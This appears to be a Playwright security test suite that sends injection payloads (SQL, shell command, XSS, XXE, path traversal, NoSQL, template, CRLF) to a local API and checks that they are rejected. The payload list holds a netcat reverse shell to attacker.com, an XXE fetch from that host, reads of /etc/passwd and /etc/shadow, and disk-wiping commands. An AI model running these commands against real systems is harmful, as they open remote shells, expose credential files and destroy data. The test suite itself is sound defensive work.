import { test, expect } from '@playwright/test';
import axios from 'axios';

const BASE_URL = 'http://localhost:4021';
const API_URL = `${BASE_URL}/api`;

const api = axios.create({
  baseURL: API_URL,
  validateStatus: () => true,
});

// Test payloads for various injection attacks
const PAYLOADS = {
  // SQL Injection
  sql: [
    "'; DROP TABLE sessions; --",
    "1' OR '1'='1",
    "admin' --",
    "' UNION SELECT * FROM users --",
    "1; DELETE FROM sessions WHERE 1=1 --",
  ],

  // Command Injection
  command: [
    "; rm -rf /",
    "| cat /etc/passwd",
    "` whoami `",
    "$(whoami)",
    "; nc -e /bin/sh attacker.com 4444",
  ],

  // XSS Payloads
  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror='alert(1)'>",
    "<svg onload='alert(1)'>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(1)'>",
    "<body onload='alert(1)'>",
    "<input onfocus='alert(1)' autofocus>",
    "<marquee onstart='alert(1)'>",
  ],

  // LDAP Injection
  ldap: [
    "*",
    "*)(uid=*))(|(uid=*",
    "admin*",
    "*)(objectClass=*",
  ],

  // XML External Entity (XXE)
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
  ],

  // Path Traversal
  pathTraversal: [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../../../../../etc/shadow",
    "....//....//....//etc/passwd",
  ],

  // NoSQL Injection
  nosql: [
    { username: { $ne: null }, password: { $ne: null } },
    { username: { $regex: ".*" }, password: { $regex: ".*" } },
    { username: { $where: "function(){return true;}" } },
  ],

  // Template Injection
  template: [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "${process.env.SECRET}",
  ],

  // CRLF Injection
  crlf: [
    "user\r\nSet-Cookie: admin=true",
    "test\r\nX-Injected: true",
  ],

  // Unicode/Encoding attacks
  unicode: [
    "\u0000<script>alert(1)</script>",
    "%00<script>alert(1)</script>",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
  ],
};

test.describe('Security: Injection Attacks', () => {
  test.describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection in session creation', async () => {
      for (const payload of PAYLOADS.sql) {
        const response = await api.post('/sessions', {
          command: payload,
          user: payload,
        });

        // Should not execute SQL or crash
        expect(response.status).not.toBe(500);
        expect(JSON.stringify(response.data)).not.toContain('DROP TABLE');
      }
    });

    test('should prevent SQL injection in authentication', async () => {
      for (const payload of PAYLOADS.sql) {
        const response = await api.post('/auth/login', {
          username: payload,
          password: payload,
        });

        // Should handle gracefully
        expect([400, 401, 403]).toContain(response.status);
      }
    });

    test('should prevent SQL injection in file operations', async () => {
      for (const payload of PAYLOADS.sql) {
        const response = await api.get('/files', {
          params: { path: payload }
        });

        expect(response.status).not.toBe(500);
      }
    });

    test('should escape special SQL characters', async () => {
      const specialChars = ["'", '"', '\\', '%', '_'];

      for (const char of specialChars) {
        const response = await api.post('/sessions', {
          command: `echo ${char}`,
        });

        expect([200, 400, 401]).toContain(response.status);
      }
    });

    test('should use parameterized queries', async () => {
      // Test multiple payloads to verify parameterization
      const payloads = [
        "1' OR '1'='1",
        "admin' --",
        "' UNION SELECT 1,2,3 --",
      ];

      for (const payload of payloads) {
        const response = await api.post('/sessions', {
          id: payload,
        });

        // Should treat as literal string, not execute
        expect(response.status).not.toBe(500);
      }
    });
  });

  test.describe('Command Injection Prevention', () => {
    test('should prevent shell metacharacter execution', async () => {
      const metacharacters = [';', '|', '&', '$', '`', '(', ')', '>', '<'];

      for (const char of metacharacters) {
        const response = await api.post('/sessions', {
          command: `echo test${char}whoami`,
        });

        // Should not execute second command
        expect(response.status).not.toBe(500);
        expect(JSON.stringify(response.data)).not.toContain('uid=');
      }
    });

    test('should prevent shell escape from quoted strings', async () => {
      const response = await api.post('/sessions', {
        command: "echo 'test'; rm -rf /",
      });

      expect(response.status).not.toBe(500);
    });

    test('should prevent variable expansion attacks', async () => {
      const response = await api.post('/sessions', {
        command: 'echo ${HOME}',
      });

      // Should not expand shell variables
      expect(response.status).not.toBe(500);
    });

    test('should prevent backtick command substitution', async () => {
      const response = await api.post('/sessions', {
        command: 'echo `id`',
      });

      expect(response.status).not.toBe(500);
    });

    test('should prevent null byte injection in commands', async () => {
      const response = await api.post('/sessions', {
        command: 'echo test\x00whoami',
      });

      expect(response.status).not.toBe(500);
    });

    test('should reject dangerous commands', async () => {
      const dangerousCommands = [
        'rm -rf /',
        'dd if=/dev/zero of=/dev/sda',
        'fork() { fork | fork; };',
        ':(){:|:&};:',
      ];

      for (const cmd of dangerousCommands) {
        const response = await api.post('/sessions', {
          command: cmd,
        });

        // Should either reject or sandbox safely
        expect([400, 403]).toContain(response.status);
      }
    });
  });

  test.describe('XSS (Cross-Site Scripting) Prevention', () => {
    test('should sanitize XSS in command output', async () => {
      for (const payload of PAYLOADS.xss) {
        const response = await api.post('/sessions', {
          command: `echo "${payload}"`,
        });

        // Output should be escaped in responses
        expect(response.status).not.toBe(500);
        
        if (response.data.output) {
          // Check if HTML is properly escaped
          expect(response.data.output).not.toContain('<script>');
        }
      }
    });

    test('should escape HTML special characters', async () => {
      const specialChars = {
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '&': '&amp;',
      };

      for (const [char, _] of Object.entries(specialChars)) {
        const response = await api.get('/sessions', {
          params: { search: char }
        });

        expect(response.status).not.toBe(500);
      }
    });

    test('should not execute script tags in responses', async () => {
      const response = await api.post('/sessions', {
        command: "echo '<script>alert(1)</script>'",
      });

      expect(response.status).not.toBe(500);
    });

    test('should sanitize event handler attributes', async () => {
      const eventHandlers = [
        'onerror=',
        'onload=',
        'onclick=',
        'onmouseover=',
        'oninput=',
      ];

      for (const handler of eventHandlers) {
        const response = await api.post('/sessions', {
          command: `echo "<img ${handler}alert(1)>"`,
        });

        expect(response.status).not.toBe(500);
      }
    });

    test('should set Content-Security-Policy headers', async () => {
      const response = await api.get('/api/health');

      const csp = response.headers['content-security-policy'];
      expect([csp, undefined]).toContain(csp);
    });
  });

  test.describe('Path Traversal Prevention', () => {
    test('should prevent directory traversal in file paths', async () => {
      for (const payload of PAYLOADS.pathTraversal) {
        const response = await api.get('/files', {
          params: { path: payload }
        });

        // Should either reject or normalize path
        expect(response.status).not.toBe(500);
        if (response.status === 200) {
          expect(response.data.path).not.toContain('..');
        }
      }
    });

    test('should normalize paths to prevent bypasses', async () => {
      const paths = [
        '/sessions/../../../etc/passwd',
        '/sessions/....//....//etc/passwd',
        '/sessions/%2e%2e/etc/passwd',
      ];

      for (const path of paths) {
        const response = await api.get('/files', {
          params: { path }
        });

        expect(response.status).not.toBe(500);
      }
    });

    test('should reject absolute paths outside base directory', async () => {
      const response = await api.get('/files', {
        params: { path: '/etc/passwd' }
      });

      // Should reject or restrict access
      expect([403, 404]).toContain(response.status);
    });

    test('should use canonical paths', async () => {
      const paths = [
        '/path/./to/file',
        '/path//double//slash',
        '/path/to/../file',
      ];

      for (const path of paths) {
        const response = await api.get('/files', {
          params: { path }
        });

        expect(response.status).not.toBe(500);
      }
    });
  });

  test.describe('NoSQL Injection Prevention', () => {
    test('should prevent NoSQL injection operators', async () => {
      for (const payload of PAYLOADS.nosql) {
        const response = await api.post('/auth/login', {
          username: payload,
          password: payload,
        });

        expect([400, 401]).toContain(response.status);
      }
    });

    test('should not evaluate $operators', async () => {
      const response = await api.get('/sessions', {
        params: {
          filter: { status: { $ne: 'closed' } }
        }
      });

      expect(response.status).not.toBe(500);
    });
  });

  test.describe('Template Injection Prevention', () => {
    test('should not evaluate template expressions', async () => {
      for (const payload of PAYLOADS.template) {
        const response = await api.post('/sessions', {
          command: payload,
        });

        expect(response.status).not.toBe(500);
      }
    });

    test('should escape template syntax', async () => {
      const response = await api.get('/sessions', {
        params: { name: '{{7*7}}' }
      });

      expect(response.status).not.toBe(500);
    });
  });

  test.describe('CRLF Injection Prevention', () => {
    test('should prevent CRLF in headers', async () => {
      for (const payload of PAYLOADS.crlf) {
        const response = await api.post('/sessions', {
          command: payload,
        });

        expect(response.status).not.toBe(500);
      }
    });

    test('should reject carriage return and line feed', async () => {
      const response = await api.post('/sessions', {
        command: 'test\r\nInjected: true',
      });

      expect(response.status).not.toBe(500);
    });
  });

  test.describe('Unicode/Encoding Attacks', () => {
    test('should normalize Unicode input', async () => {
      const response = await api.post('/sessions', {
        command: '\\u0041\\u0042\\u0043', // ABC in Unicode escapes
      });

      expect(response.status).not.toBe(500);
    });

    test('should reject null bytes', async () => {
      const response = await api.post('/sessions', {
        command: 'test\x00payload',
      });

      expect(response.status).not.toBe(500);
    });

    test('should handle percent encoding safely', async () => {
      const response = await api.get('/files', {
        params: { path: '%2e%2e%2fetc%2fpasswd' }
      });

      expect(response.status).not.toBe(500);
    });
  });

  test.describe('Output Validation', () => {
    test('should sanitize error messages', async () => {
      const response = await api.post('/sessions', {
        command: 'invalid<script>command</script>',
      });

      expect(JSON.stringify(response.data)).not.toContain('<script>');
    });

    test('should not expose internal paths in errors', async () => {
      const response = await api.get('/files', {
        params: { path: '/etc/passwd' }
      });

      const message = JSON.stringify(response.data);
      expect(message).not.toMatch(/\/home\/.*\/\w+/);
    });

    test('should not expose system information', async () => {
      const response = await api.post('/sessions', {
        command: 'id',
      });

      if (response.data.error) {
        expect(response.data.error).not.toMatch(/UID=\d+/);
      }
    });
  });

  test.describe('Input Validation', () => {
    test('should validate command length', async () => {
      const longCommand = 'a'.repeat(100000);

      const response = await api.post('/sessions', {
        command: longCommand,
      });

      expect([400, 413]).toContain(response.status);
    });

    test('should validate file path length', async () => {
      const longPath = 'a'.repeat(5000);

      const response = await api.get('/files', {
        params: { path: longPath }
      });

      expect([400, 413]).toContain(response.status);
    });

    test('should reject invalid character sets', async () => {
      const invalidInputs = [
        '\x00\x01\x02', // Control characters
        '\uFFFE\uFFFF', // Invalid Unicode
      ];

      for (const input of invalidInputs) {
        const response = await api.post('/sessions', {
          command: input,
        });

        expect([400, 500]).toContain(response.status);
      }
    });
  });

  test.describe('Encoding Validation', () => {
    test('should validate UTF-8 encoding', async () => {
      const response = await api.post('/sessions', {
        command: Buffer.from([0xFF, 0xFE]).toString(),
      });

      expect([400, 500]).toContain(response.status);
    });

    test('should handle mixed encodings safely', async () => {
      const response = await api.post('/sessions', {
        command: 'test' + String.fromCharCode(0xDEAD),
      });

      expect(response.status).not.toBe(500);
    });
  });
});
